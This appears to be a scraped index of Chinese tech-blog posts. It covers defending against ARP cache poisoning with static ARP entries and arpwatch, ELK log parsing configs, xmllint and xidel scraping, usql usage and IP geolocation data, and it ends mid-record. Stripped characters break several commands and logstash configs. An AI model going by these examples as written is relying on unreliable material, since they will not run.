Linux命令 arp","title":"Linux命令 arp","text":"ARP缓存攻击是一项非常危险的攻击，重要的是在用户中创建安全的意识和分析有效的工具和策略。如果你操作的是小型网络，那么就很容易维护ARP。但是在大型的网络，维护ARP是很困难和费事的。在前一篇文章的最后我们讨论了工具和技术，能够被用来检测ARP缓存中毒攻击。让我们来回顾下每一步:\r\n静态ARP\r\n你可以在网络ARP表中手动的添加一些信息，一旦信息插入，你就有了静态ARP映射。输入数据的过程也是非常简单，在你的终端/CMS中，只需输入：“arp -s”\r\n例子：\r\n你现在的ARP表：\r\nroot@bt:~# arp\r\nAddress HWtype HWaddress Flags Mask Iface\r\n192.168.1.1 ether 00:22:93:cf:eb:6d C eth0\r\n让我们假设一下，我想添加一个新的主机在我的ARP缓存表中，我输入如下命令：\r\narp -s IP MAC\r\nroot@bt:~# arp -s 192.168.1.2 00:50:FC:A8:36:F5\r\nroot@bt:~# arp\r\nAddress HWtype HWaddress Flags Mask Iface\r\n192.168.1.2 ether 00:50:fc:a8:36:f5 CM eth0\r\n192.168.1.1 ether 00:22:93:cf:eb:6d C eth0\r\nroot@bt:~#\r\n需要注意的是，手动添加ARP表只适用于当前的会话。当你重新启动计算机，将更新表。如果你想要使用这种方法，那么你可以创建一个批处理文件/BASH文件，并将它们添加到启动项。\r\nARPwatch\r\n(ps：监听ARP记录)\r\n这是一个不错的实用程序，已经被用来监测ARP网络，它能够探测并记录发生更改的网络，同时还发送邮箱详细说明各自的变化。安装过程也是非常简单的。\r\n对于Ubuntu用户：\r\napt-get install arpwatch\r\nroot@bt:~ arpwatch -h\r\nVersion 2.1a15\r\nusage: arpwatch [-dN] [-f datafile] [-i interface] [-n net[/width]] [-r file] [-s sendmail_path] [-p] [-a] [-m addr] [-u username] [-R seconds ] [-Q] [-z ignorenet/ignoremask]\r\n如果需要快速检测就用下面这个命令：\r\narpwatch -i interface\r\nroot@bt:~ arpwatch -i eth0\r\n检查程序是否在运行：\r\nroot@bt:~# ps -ef | grep arpwatch\r\narpwatch 1041 1 0 14:05 ? 00:00:00 /usr/sbin/arpwatch -u arpwatch -N -p\r\nroot 2191 2165 0 14:54 pts/0 00:00:00 grep –color=auto arpwatch\r\n接下来的步骤就是ARPwatch记录日志，这也非常简单，你只需要做得是确定目录，然后读取文件。\r\noot@bt:~# cd /var/lib/arpwatch\r\nroot@bt:/var/lib/arpwatch# ls\r\narp.dat arp.dat-\r\nroot@bt:/var/lib/arpwatch# cat arp.dat\r\n00:50:fc:a8:36:f5    192.168.1.2    1337437776        eth0\r\n00:27:0e:21:a6:1e    192.168.1.5    1337437923        eth0\r\n所以如果你是网络管理员，那么你应该实施一些策略来监视ARP表并且保护主机免受ARP中毒攻击。\r\n当然我们要注意，中间人攻击并不局限于一个ARP欺骗攻击。正如前面提到的，还有许多其他的技术能够执行一个中间人攻击。一个主要的例子就是DNS欺骗，我们将分析它。","tags":null},{"location":"//blog.pytool.com/Post/Elastic/2016-10-04 Elastic ELK实战之解析各类日志文件","title":"ELK实战之解析各类日志文件","text":"ELK实战之解析各类日志文件\n\n  摘要：本文属于原创，欢迎转载，转载请保留出处：https://github.com/jasonGeng88/blog\n\n  ELK环境是基于docker进行的容器化部署 br\n  关于容器化部署，详情见上一篇 “ELK：基于ELK+Filebeat的日志搭建”\n\n 当前环境\nlogstash：5.2\n\n介绍\n基于上一篇讲述了ELK日志系统的搭建，那么就该讲讲ELK在生产中的实际使用场景了。br\n\n作为一个日志中心，它会收集各种各样的日志，可以用于问题排查，数据监控，统计分析等等。那么对于繁多的日志，它们都有各自的存储格式，我们如何来区分它们，对于不同的日志格式，我们又是如何去解析的呢？ br\n\n一长串没有结构化的日志，给人的感觉很凌乱。我们需要的是提取日志中的有效字段，并以我们期望的形式进行展现。下面我将和大家一起来探究日志解析的奥秘。\n\n 原理\n依照前文，使用filebeat来上传日志数据，logstash进行日志收集与处理，elasticsearch作为日志存储与搜索引擎，最后使用kibana展现日志的可视化输出。所以不难发现，日志解析主要还是logstash做的事情。br\n\n说到logstash，它到底有哪些东西呢？我们来简单看下：\n\n从上图中可以看到，logstash主要包含三大模块：\n\nINPUTS: 收集所有数据源的日志数据（源有file、redis、beats等,filebeat就是使用了beats源）；\nFILTERS: 解析、整理日志数据（本文重点）；\nOUTPUTS: 将解析的日志数据输出至存储器（elasticseach、file、syslog等）；\n\n看来FILTERS是我们探究的重点，先来来看看它常用到的几个插件（后面日志解析会用到）：\n\ngrok：采用正则的方式，解析原始日志格式，使其结构化；\ngeoip：根据IP字段，解析出对应的地理位置、经纬度等；\ndate：解析选定时间字段，将其时间作为logstash每条记录产生的时间（若没有指定该字段，默认使用read line的时间作为该条记录时间）；\n\n注意：codec也是经常会使用到的，它主要作用在INPUTS和OUTPUTS中，提供有json的格式转换、multiline的多行日志合并等\n\n场景\n说了这么多，到底怎么用呢？我们还是通过几个例子，具体来看看是怎么实现的吧。br\n秉承先易后难的原则，希望大家全部看完后，对以后遇到更复杂的日志，也能处理的游刃有余。\n\n1. NodeJS 日志\n\n日志格式\n\n$time - $remoteaddr $loglevel $path - $msg\n\n日志内容\n\n2017-03-15 18:34:14.535 - 112.65.171.98 INFO /root/ws/socketIo.js - xxxxxx与ws server断开连接\n\nfilebeat配置（建议filebeat使用rpm安装，以systemctl start filebeat方式启动）\n\nfilebeat:\n  prospectors:\n    documenttype: nodejs 申明type字段为nodejs，默认为log\n      paths:\n        /var/log/nodejs/log #日志文件地址\n      inputtype: log #从文件中读取\n      tailfiles: true #以文件末尾开始读取数据\noutput:\n  logstash:\n      hosts: [\"${LOGSTASHIP}:5044\"]\n\nGeneral Setting\nname: \"server1\" 设置beat的名称，默认为主机hostname\n\nlogstash中FILTERS配置\n\nfilter {\n\tif [type] == \"nodejs\" { #根据filebeat中设置的type字段，来过滤不同的解析规则\n    \tgrok{\n       \t\tmatch =  { \"message\" =  \"%{TIMESTAMPISO8601:timestamp} - %{IPORHOST:clientip} %{LOGLEVEL:level} %{PATH:path} - %{GREEDYDATA:msg}\" }\n\t    }\n    \tgeoip {\n       \t\tsource =  \"clientip\" #填写IP字段\n    \t}\n    }\n}\n\n结果（为方便演示，数据有删减）\n\nFilter配置讲解\n\n\tgrok中的match内容：\n\t\tkey：表示所需解析的内容；\n\t\tvalue：表示解析的匹配规则，提取出对应的字段；\n\t\t解析语法：%{正则模板:自定义字段}，其中TIMESTAMPISO8601、IPORHOST等都是grok提供的正则模板（可在此查阅）；\n\tgeoip：通过分析IP值，产生IP对应的地理位置信息；\n\n\t这里是否发现@timestamp与timestamp不一致，@timestamp表示该日志的读取时间，在elasticsearch中作为时间检索索引。下面讲解Nginx日志时，会去修正这一问题。\n\n*\n\n2. Nginx 访问日志\n\n日志格式\n\n$remoteaddr - $remoteuser [$timelocal]\n\"$request\" $status $bodybytessent \"$httpreferer\"\n\"$httpuseragent\" \"$httpxforwardedfor\"\n\n日志内容\n\n112.65.171.98 - - [15/Mar/2017:18:18:06 +0800] \"GET /index.html HTTP/1.1\" 200 1150 \"http://www.yourdomain.com/\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\" \"-\"\n\nfilebeat中prospectors的配置\n\ndocumenttype: nginx\n  paths:\n    /var/log/nginx/access.log #日志文件地址\n  inputtype: log #从文件中读取\n  tailfiles: true #以文件末尾开始读取数据\n\nlogstash中FILTERS配置\n\nfilter {\n\tif [type] == \"nginx\" {\n\t\tgrok{\n\t       match =  { \"message\" =  \"%{COMBINEDAPACHELOG}\" }\n\t    }\n\n\t   date {\n\t        match =  [ \"timestamp\" , \"dd/MMM/yyyy:HH:mm:ss Z\", \"ISO8601\" ]\n\t        target =  \"@timestamp\" #可省略\n\t    }\n\t}\n\n}\n\n结果\n\nFilter配置讲解\n\tgrok：\n\t\t是不是很不可思议，上一示例中我们匹配规则写了一长串，这个仅仅一个COMBINEDAPACHELOG就搞定了！\n\t\tgrok除了提供上面那种基础的正则规则，还对常用的日志（java,http,syslog等）提供的相应解析模板，本质还是那么一长串正则，详情见grok的120中正则模板；\n\tdate:\n\t\tmatch：数组中第一个值为要匹配的时间字段，后面的n个是匹配规则，它们的关系是or的关系，满足一个即可；\n\t\ttarget：将match中匹配的时间替换该字段，默认替换@timestamp；\n\n\t目前为止我们解析的都是单行的日志，向JAVA这样的，若果是多行的日志我们又该怎么做呢？\n\n3. JAVA Log4j 日志\n\n日志内容\n\n'2017-03-16 15:52:39,580 ERROR TestController:26 - test:\njava.lang.NullPointerException\n\tat com.test.TestController.tests(TestController.java:22)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:497)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:221)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:137)'\n\nfilebeat中prospectors的配置\n\ndocumenttype: tomcat\n  paths:\n    /var/log/java/log #日志文件地址\n  inputtype: log #从文件中读取\n  tailfiles: true #以文件末尾开始读取数据\n  multiline:\n    pattern: ^\\d{4}\n    match: after\n    negate: true\n\nlogstash中FILTERS配置\n\nfilter {\n\tif [type] == \"tomcat\" {\n\t\tgrok{\n\t\t\tmatch =  { \"message\" =  \"%{TIMESTAMPISO8601:timestamp} %{LOGLEVEL:level} %{JAVALOGMESSAGE:msg}\" }\n\t\t}\n\n\t\tdate {\n\t   \t\tmatch =  [ \"timestamp\" , \"yyyy-MM-dd HH:mm:ss,S\", \"ISO8601\" ]\n\t\t}\n\t}\n\n}I\n\n结果\n\nFilebeat配置讲解\n\tmultiline 合并多行日志：\n\t\tpattern：匹配规则，这里指匹配每条日志开始的年份；\n\t\tmatch：有before与after，这里指从该行开始向后匹配；\n\t\tnegate：是否开始一个新记录，这里指当pattern匹配后，结束之前的记录，创建一条新日志记录；\n\n\t\t当然在logstash input中使用codec multiline设置是一样的\n\n小技巧：关于grok的正则匹配，官方有给出Grok Constructor方法，在这上面提供了debugger、自动匹配等工具，方便大家编写匹配规则*\n\n总结\n本文开始简单介绍了logstash的三大模块：INPUTS、FILTERS、OUTPUTS。之后通过Demo了3个小示例，给大家讲解了FILTERS中grok、geoip、date三个常用插件的使用，以及在处理多行日志上的做法。br\n\n在描述的过程中可能不能面面俱到，但我还是始终坚持“font color=red知其然知其所以然/font”的理念。写的每一行代码，你都得心中有数。功能的实现不意味着结束，我们何不多折磨自己一下，走好最后的一公里。br\n\n最后，有兴趣可以去看一下它的官方手册，对这三大模块，各自都提供了非常多的插件支持。我这里只是一个简单的使用，希望对大家有所帮助。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 xml","title":"Linux命令 xml","text":"xmllint + xpath = 命令行网页信息提取\r\n\r\n\r\n昨天看到一个玩意儿叫 XPath ，就是 @Anho 同学他们搞的那个，用来提取网页信息的，我觉得 xpath 是个好东西！\r\n\r\n然后我想到 libxml2 提供了一个命令行工具叫 xmllint 。我发现它有个 --xpath 的选项可以执行 xpath ，还有个 --html 选项可以解析 html 。经过一些实验，我得到了下面的命令：\r\n\r\n在 123cha 上查询 8.8.8.8 ，并提取结果（ulcsstb）：\r\n\r\n    curl http://www.123cha.com/ip/?q=8.8.8.8 2  /dev/null | xmllint --html --xpath \"//ul［@id='csstb'］\" - 2  /dev/null | sed -e 's/［^］  //g'\r\n\r\n结果：\r\n\r\n    ［您的查询］:8.8.8.8\r\n    本站主数据:\r\n    美国\r\n    本站辅数据:Google Public DNS提供:hypo\r\n    美国 Google免费的Google Public DNS提供:zwstar参考数据一:美国\r\n    参考数据二:美国\r\n\r\n这意味着什么？这意味着各种简单的网页信息提取任务可以用 shell 脚本完成。如果你以前为了实现同样的功能，动辄 BeautifulSoup 的话，可以换了。\r\n\r\n\r\nA command line tool to download and extract data from HTML/XML pages or JSON-APIs, using CSS, XPath 3.0, XQuery 3.0, JSONiq or pattern templates. It can also create new or transformed XML/HTML/JSON documents.\r\ngithub.com/benibela/xidel\r\n\r\n\r\nPrint all urls found by a google search.\r\n\r\nxidel http://www.google.de/search?q=test --extract \"//a/extract(@href, 'url[?]q=(+)\u0026', 1)[. != '']\"\r\nPrint the title of all pages found by a google search and download them:\r\n\r\nxidel http://www.google.de/search?q=test --follow \"//a/extract(@href, 'url[?]q=(+)\u0026', 1)[. != '']\" --extract //title --download '{$host}/'\r\nGenerally follow all links on a page and print the titles of the linked pages:\r\nWith XPath: xidel http://example.org -f //a -e //title\r\nWith CSS: xidel http://example.org -f \"css('a')\" --css title\r\nWith Templates: xidel http://example.org -f \"a{.}/a\" -e \"title{.}/title\"\r\nAnother template example:\r\n\r\nIf you have an example.xml file like xfooood/foobarIMPORTANT!/bar/x\r\nYou can read the imporant part like: xidel example.xml -e \"xfooood/foobar{.}/bar/x\"\r\n(and this will also check, if the element containing \"ood\" is there, and fail otherwise)\r\nCalculate something with XPath using arbitrary precision arithmetics:\r\n\r\nxidel -e \"(1 + 2 + 3)  1000000000000 + 4 + 5 + 6 + 7.000000008\"\r\nPrint all newest Stackoverflow questions with title and url:\r\n\r\nxidel http://stackoverflow.com -e \"A class='question-hyperlink'{title:=text(), url:=@href}/A\"\r\nPrint all reddit comments of an user, with HTML and URL:\r\n\r\nxidel \"http://www.reddit.com/user/username/\" --extract \"t:loopdiv class='usertext-body'div{outer-xml(.)}/div/divul class='flat-list buttons'at:slink:=@href/t:spermalink/a/ul/div/div/t:loop\" --follow \"a rel='nofollow next'{.}/a?\"\r\nCheck if your reddit letter is red:\r\nWebscraping, combining CSS, XPath, JSONiq and automatically form evaluation:\r\n\r\nxidel http://reddit.com -f \"form(css('form.login-form')[1], {'user': '$yourusername', 'passwd': '$yourpassword'})\" -e \"css('mail')/@title\"\r\nUsing the Reddit API:\r\n\r\nxidel -d \"user=$yourusername\u0026passwd=$yourpassword\u0026apitype=json\" https://ssl.reddit.com/api/login --method GET 'http://www.reddit.com/api/me.json' -e '($json).data.hasmail'\r\nUse XQuery, to create a HTML table of odd and even numbers:\r\n\r\nWindows cmd: xidel --xquery \"table{for $i in 1 to 1000 return trtd{$i}/tdtd{if ($i mod 2 = 0) then 'even' else 'odd'}/td/tr}/table\" --output-format xml\r\nLinux/Powershell: xidel --xquery 'table{for $i in 1 to 1000 return trtd{$i}/tdtd{if ($i mod 2 = 0) then \"even\" else \"odd\"}/td/tr}/table' --output-format xml\r\n(Xidel itself supports ' and \"-quotes on all platforms, but ' does not escape  in Windows' cmd, and \" does not escape $ in the Linux shells)\r\nExport variables to bash\r\n\r\neval \"$(xidel http://site -e 'title:=//title' -e 'links:=//a/@href' --output-format bash)\"\r\n\r\nThis sets the bash variable $title to the title of the page and $links becomes an array of all links there.\r\nReading JSON:\r\n\r\nRead the 10th array element: xidel file.json -e '$json(10)'\r\nRead all array elements: xidel file.json -e '$json()'\r\nRead property \"foo\" and then \"bar\" with JSONiq notation: xidel file.json -e '$json(\"foo\")(\"bar\")'\r\nRead property \"foo\" and then \"bar\" with dot notation: xidel file.json -e '($json).foo.bar'\r\nRead property \"foo\" and then \"bar\" with XPath-like notation: xidel file.json -e '$json/foo/bar'\r\nMixed example: xidel file.json -e '$json(\"abc\")()().xyz/(u,v)'\r\nThis would read all the numbers from e.g. {\"abc\": [[{\"xyz\": {\"u\": 1, \"v\": 2}}], [{\"xyz\": {\"u\": 3}}, {\"xyz\": {\"u\": 4}} ]]}.\r\nAll selectors are sequence-transparent, i.e. you can use the same selector to read something from one value as to read it from several values. Arrays are converted to sequences with ()\r\nConvert table rows and columns to a CSV-like format:\r\n\r\nxidel http://site -e '//tr / join(td, \",\")'\r\n\r\njoin((...)) can generally be used to output some values in a single line. The function name is an abbreviation for the XPath function string-join. In the example tr / join calls join for every row.\r\nModify/Transform an HTML file, e.g. to mark all links as bold:\r\n\r\nWindows cmd:\r\nxidel --html your-file.html --xquery \"transform(/, function($e) {\r\n   $e / if (name() = 'a') then\r\n           a style='{join((@style, 'font-weight: bold'), '; ')}'{@ except @style, node()}/a\r\n        else .\r\n})\"   your-output-file.html\r\nLinux/Powershell:\r\nxidel --html your-file.html --xquery 'transform(/, function($e) {\r\n   $e / if (name() = \"a\") then\r\n           a style=\"{join((@style, \"font-weight: bold\"), \"; \")}\"{@ except @style, node()}/a\r\n        else .\r\n})'   your-output-file.html\r\n\r\nThis example combines three important syntaxes:\r\ntransform(/, function($e) { .. }: This applies an anonymous function to every element in the HTML document, whereby that element is stored in variable $e and is replaced by the return value of the function.\r\na{@* except @style, node()}/a : This creates a new a-element that has the same children, descendants and attributes as the current element, but removes the style-attribute.\r\nstyle=\"{join((@style, \"font-weight: bold\"), \"; \")}\": This creates a new style-attribute by appending \"font-weight: bold\" to the old value of the attribute. A separating \"; \" is inserted, if (and only if) that attribute already existed.\r\n\r\nYou may also want to read the readme file of Xidel, the complete list of available functions, the documentation of my template language and XPath/XQuery 3.0 library. Or look at its results on the XQuery Testsuite.\r\nDownloads\r\n\r\nThe following Xidel downloads are available on the sourceforge download page:\r\n\r\nOperating System\tFilename\tSize\r\nWindows: 32 Bit\txidel-0.9.6.win32.zip\t801.8 kB\r\nUniversal Linux: 64 Bit\txidel-0.9.6.linux64.tar.gz\t1.3 MB\r\nUniversal Linux: 32 Bit\txidel-0.9.6.linux32.tar.gz\t852.8 kB\r\nSource:\txidel-0.9.6.src.tar.gz\t1.9 MB\r\nDebian: 64 Bit\txidel0.9.6-1amd64.deb\t967.1 kB\r\nDebian: 32 Bit\txidel0.9.6-1i386.deb\t659.8 kB\r\nMac 10.8\texternally prebuilt version and compile instructions.\r\n\r\nUsually you can just extract the zip/deb and call Xidel, or copy it to some place in your PATH,\r\nbecause it consists of a single binary without any external dependencies, except the standard system libraries (i.e. Windows API or respectively libc).\r\nHowever, for https connections on Linux openssl (including openssl-dev) and libcrypto are also required.\r\n\r\nYou can also test it online on a webpage or directly by sending a request to the cgi service like http://www.videlibri.de/cgi-bin/xidelcgi?data=htmltitlefoobar/title/html\u0026extract=//title\u0026raw=true.\r\n\r\n\r\nThe source is stored in a mercurial repository together with the VideLibri source.\r\n\r\nYou can compile it with FreePascal and a regular expression library, preferably my copy of FLRE.\r\nTo compile it on the command line, call fpc xidel.pas and pass the paths to all directories using the -Fu option.\r\nAlternatively, it can be compiled using Lazarus. For this install components/pascal/internettools.lpk and components/pascal/internettools_utf8.lpk in Lazarus, then open programs/internet/xidel/xidel.lpi and click on Run\\Compile.\r\n\r\n\r\n\r\nPronounciation: To say the name \"Xidel\" in English, you say \"excited\" with a silent \"C\" and \"D\", followed by an \"L\". In German, you just say it as it is written.","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang工具usql ","title":"通用SQL命令行工具 usql","text":"通用SQL命令行工具 usql\nMore coming soon!\nBuild/Install from Source\n\nYou can build or install usql from source in the usual Go fashion:\n\ninstall usql (includes support for PosgreSQL, MySQL, SQLite3, and MS SQL)\n$ go get -u github.com/knq/usql\n\n install all drivers\n$ go get -u -tags all github.com/knq/usql\n\ninstall with \"most\" drivers (same as \"all\" but excludes oracle/odbc)\n$ go get -u -tags most github.com/knq/usql\n\n install with base drivers and oracle / odbc support\n$ go get -u -tags 'oracle odbc' github.com/knq/usql\n\ninstall all drivers but exclude avatica, and couchbase drivers\n$ go get -u -tags 'all noavatica nocouchbase'\n\n connect to a postgres database\n$ usql pg://user:pass@localhost/dbname\n$ usql pgsql://user:pass@localhost/dbname\n$ usql postgres://user:pass@localhost:port/dbname\n\nconnect to a mysql database\n$ usql my://user:pass@localhost/dbname\n$ usql mysql://user:pass@localhost:port/dbname\n$ usql /var/run/mysqld/mysqld.sock\n\n connect to a mssql (Microsoft SQL) database\n$ usql ms://user:pass@localhost/dbname\n$ usql mssql://user:pass@localhost:port/dbname\n\nconnect using Windows domain authentication to a mssql (Microsoft SQL)\n database\n$ runas /user:ACME\\wiley /netonly \"usql mssql://host/dbname/\"\n\nconnect to a oracle database\n$ usql or://user:pass@localhost/dbname\n$ usql oracle://user:pass@localhost:port/dbname\n\n connect to a pre-existing sqlite database\n$ usql dbname.sqlite3\n\nnote: when not using a \"scheme://\" or \"scheme:\" prefix, the file must already\n exist; if it doesn't, please prefix with file:, sq:, sqlite3: or any other\nscheme alias recognized by the dburl package for sqlite databases, and sqlite\n will create a new database, like the following:\n$ usql sq://path/to/dbname.sqlite3\n$ usql sqlite3://path/to/dbname.sqlite3\n$ usql file:/path/to/dbname.sqlite3\n\nconnect to a adodb ole resource (windows only)\n$ usql adodb://Microsoft.Jet.OLEDB.4.0/myfile.mdb\n$ usql \"adodb://Microsoft.ACE.OLEDB.12.0/?Extended+Properties=\\\"Text;HDR=NO;FMT=Delimited\\\"\"\n\nBackslash (\\) Commands\n\nThe following are the currently supported backslash (\\) meta commands available to interactive usql sessions or to included (ie, \\i) scripts:\n\nGeneral\n  \\q                    quit usql\n  \\copyright            show usql usage and distribution terms\n  \\drivers              display information about available database drivers\n  \\g [FILE] or ;        execute query (and send results to file or |pipe)\n  \\gexec                execute query and execute each value of the result\n  \\gset [PREFIX]        execute query and store results in usql variables\n\nHelp\n  \\? [commands]         show help on backslash commands\n  \\? options            show help on usql command-line options\n  \\? variables          show help on special variables\n\nQuery Buffer\n  \\e [FILE] [LINE]      edit the query buffer (or file) with external editor\n  \\p                    show the contents of the query buffer\n  \\r                    reset (clear) the query buffer\n  \\w FILE               write query buffer to file\n\nInput/Output\n  \\echo [STRING]        write string to standard output\n  \\i FILE               execute commands from file\n  \\ir FILE              as \\i, but relative to location of current script\n\nTransaction\n  \\begin                begin a transaction\n  \\commit               commit current transaction\n  \\rollback             rollback (abort) current transaction\n\nConnection\n  \\c URL                connect to database with url\n  \\c DRIVER PARAMS...   connect to database with SQL driver and parameters\n  \\Z                    close database connection\n  \\password [USERNAME]  change the password for a user\n  \\conninfo             display information about the current database connection\n\nOperating System\n  \\cd [DIR]             change the current working directory\n  \\setenv NAME [VALUE]  set or unset environment variable\n  \\! [COMMAND]          execute command in shell or start interactive shell\n\nVariables\n  \\prompt [TEXT] NAME   prompt user to set internal variable\n  \\set [NAME [VALUE]]   set internal variable, or list all if no parameters\n  \\unset NAME           unset (delete) internal variable","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang ip","title":"ip","text":"timezone https://timezonedb.com/download\nhttps://www.ip2location.com/free/zipcode-metro\n\ngithub.com/G-Core/geodns  # 国家 区域\n\nLocale\ntimezone\ngmtoffset\nAlpha2:      \"LB\",\nAlpha3:      \"LBN\",\nCountryCode: \"961\",\n\nChina Postal Code (中国邮政编码):\nTime Zone\tAmerica/LosAngeles\nGMT Offset\tUTC/GMT -8.00 hours\nDST\tNo\nCity\tSan Mateo\nRegion\tCalifornia\nCountry\tUnited States\n互联网的IP地址和AS号码分配是分级进行的。\nICANN(IANA)将地址分配给区域互联网地址注册机构（RIR），\nRIR负责各自地区的IP地址分配、注册和管理工作。\n通常RIR会直接或通过当地的国家级互联网注册机构(NIR)将IP地址进一步分配给本地互联网注册机构(LIR),然后由LIR进一步分配给下游的互联网服务提供商或终端用户。\n目前，全球共有5个RIR：\nARIN(负责北美地区业务)、\nRIPE NCC(负责欧洲地区业务)、\nAPNIC（负责亚太地区业务）、\nLACNIC（负责拉丁美洲地区业务）、\nAfriNIC（负责非洲地区业务）。\n\n统一电话号码  github.com/dicefm/extraterrestrial\nfiorix/freegeoip: IP geolocation web server\n 获取用户的真实IP\ntomasen/realip\n\nhttp://blog.csdn.net/wangshubo1989/article/details/78066344\n\nhttp://ip.taobao.com/service/getIpInfo.php?ip=62.12.55.3\n\n国家 代码转换 cn\nhttps://github.com/rainycape/countries\n\n[{\"isoCode\":\"cn\",\"name\":\"中国\",\"phoneCode\":\"86\"},{\"isoCode\":\"tw\",\"name\":\"台湾地区\",\"phoneCode\":\"886\"},{\"isoCode\":\"hk\",\"name\":\"中国香港\",\"phoneCode\":\"852\"},{\"isoCode\":\"mo\",\"name\":\"中国澳门\",\"phoneCode\":\"853\"},{\"isoCode\":\"al\",\"name\":\"阿尔巴尼亚\",\"phoneCode\":\"355\"},{\"isoCode\":\"dz\",\"name\":\"阿尔及利亚\",\"phoneCode\":\"213\"},{\"isoCode\":\"af\",\"name\":\"阿富汗\",\"phoneCode\":\"93\"},{\"isoCode\":\"ar\",\"name\":\"阿根廷\",\"phoneCode\":\"54\"},{\"isoCode\":\"ae\",\"name\":\"阿联酋\",\"phoneCode\":\"971\"},{\"isoCode\":\"aw\",\"name\":\"阿鲁巴岛\",\"phoneCode\":\"297\"},{\"isoCode\":\"om\",\"name\":\"阿曼\",\"phoneCode\":\"968\"},{\"isoCode\":\"az\",\"name\":\"阿塞拜疆\",\"phoneCode\":\"994\"},{\"isoCode\":\"eg\",\"name\":\"埃及\",\"phoneCode\":\"20\"},{\"isoCode\":\"et\",\"name\":\"埃塞俄比亚\",\"phoneCode\":\"251\"},{\"isoCode\":\"ie\",\"name\":\"爱尔兰\",\"phoneCode\":\"353\"},{\"isoCode\":\"ee\",\"name\":\"爱沙尼亚\",\"phoneCode\":\"372\"},{\"isoCode\":\"ad\",\"name\":\"安道尔\",\"phoneCode\":\"376\"},{\"isoCode\":\"ao\",\"name\":\"安哥拉\",\"phoneCode\":\"244\"},{\"isoCode\":\"ai\",\"name\":\"安圭拉\",\"phoneCode\":\"1264\"},{\"isoCode\":\"ag\",\"name\":\"安提瓜和巴布达\",\"phoneCode\":\"1\"},{\"isoCode\":\"at\",\"name\":\"奥地利\",\"phoneCode\":\"43\"},{\"isoCode\":\"ax\",\"name\":\"奥兰岛\",\"phoneCode\":\"000\"},{\"isoCode\":\"au\",\"name\":\"澳大利亚\",\"phoneCode\":\"61\"},{\"isoCode\":\"bb\",\"name\":\"巴巴多斯\",\"phoneCode\":\"1246\"},{\"isoCode\":\"pg\",\"name\":\"巴布亚新几内亚\",\"phoneCode\":\"675\"},{\"isoCode\":\"bs\",\"name\":\"巴哈马群岛\",\"phoneCode\":\"1242\"},{\"isoCode\":\"pk\",\"name\":\"巴基斯坦\",\"phoneCode\":\"92\"},{\"isoCode\":\"py\",\"name\":\"巴拉圭\",\"phoneCode\":\"595\"},{\"isoCode\":\"ps\",\"name\":\"巴勒斯坦领土\",\"phoneCode\":\"970\"},{\"isoCode\":\"bh\",\"name\":\"巴林岛\",\"phoneCode\":\"973\"},{\"isoCode\":\"pa\",\"name\":\"巴拿马\",\"phoneCode\":\"507\"},{\"isoCode\":\"br\",\"name\":\"巴西\",\"phoneCode\":\"55\"},{\"isoCode\":\"by\",\"name\":\"白俄罗斯\",\"phoneCode\":\"375\"},{\"isoCode\":\"bm\",\"name\":\"百慕大群岛\",\"phoneCode\":\"1\"},{\"isoCode\":\"bg\",\"name\":\"保加利亚\",\"phoneCode\":\"359\"},{\"isoCode\":\"mp\",\"name\":\"北马里亚纳群岛\",\"phoneCode\":\"1670\"},{\"isoCode\":\"bj\",\"name\":\"贝宁\",\"phoneCode\":\"229\"},{\"isoCode\":\"be\",\"name\":\"比利时\",\"phoneCode\":\"32\"},{\"isoCode\":\"is\",\"name\":\"冰岛\",\"phoneCode\":\"354\"},{\"isoCode\":\"bo\",\"name\":\"玻利维亚\",\"phoneCode\":\"591\"},{\"isoCode\":\"pr\",\"name\":\"波多黎各\",\"phoneCode\":\"1\"},{\"isoCode\":\"ba\",\"name\":\"波黑\",\"phoneCode\":\"387\"},{\"isoCode\":\"pl\",\"name\":\"波兰\",\"phoneCode\":\"48\"},{\"isoCode\":\"bw\",\"name\":\"博茨瓦纳\",\"phoneCode\":\"267\"},{\"isoCode\":\"bz\",\"name\":\"伯利兹\",\"phoneCode\":\"501\"},{\"isoCode\":\"bt\",\"name\":\"不丹\",\"phoneCode\":\"975\"},{\"isoCode\":\"bf\",\"name\":\"布基纳法索\",\"phoneCode\":\"226\"},{\"isoCode\":\"bi\",\"name\":\"布隆迪\",\"phoneCode\":\"257\"},{\"isoCode\":\"bv\",\"name\":\"布维岛\",\"phoneCode\":\"000\"},{\"isoCode\":\"kp\",\"name\":\"朝鲜\",\"phoneCode\":\"850\"},{\"isoCode\":\"gq\",\"name\":\"赤道几内亚\",\"phoneCode\":\"240\"},{\"isoCode\":\"dk\",\"name\":\"丹麦\",\"phoneCode\":\"45\"},{\"isoCode\":\"de\",\"name\":\"德国\",\"phoneCode\":\"49\"},{\"isoCode\":\"tl\",\"name\":\"东帝汶\",\"phoneCode\":\"670\"},{\"isoCode\":\"tp\",\"name\":\"东帝汶\",\"phoneCode\":\"000\"},{\"isoCode\":\"tl\",\"name\":\"东帝汶\",\"phoneCode\":\"670\"},{\"isoCode\":\"tp\",\"name\":\"东帝汶\",\"phoneCode\":\"000\"},{\"isoCode\":\"tg\",\"name\":\"多哥\",\"phoneCode\":\"228\"},{\"isoCode\":\"dm\",\"name\":\"多米尼加\",\"phoneCode\":\"1767\"},{\"isoCode\":\"do\",\"name\":\"多米尼加共和国\",\"phoneCode\":\"1809\"},{\"isoCode\":\"ru\",\"name\":\"俄罗斯联邦\",\"phoneCode\":\"7\"},{\"isoCode\":\"sv\",\"name\":\"厄尔萨尔瓦多\",\"phoneCode\":\"503\"},{\"isoCode\":\"ec\",\"name\":\"厄瓜多尔\",\"phoneCode\":\"593\"},{\"isoCode\":\"er\",\"name\":\"厄立特里亚\",\"phoneCode\":\"291\"},{\"isoCode\":\"fr\",\"name\":\"法国\",\"phoneCode\":\"33\"},{\"isoCode\":\"fo\",\"name\":\"法罗群岛\",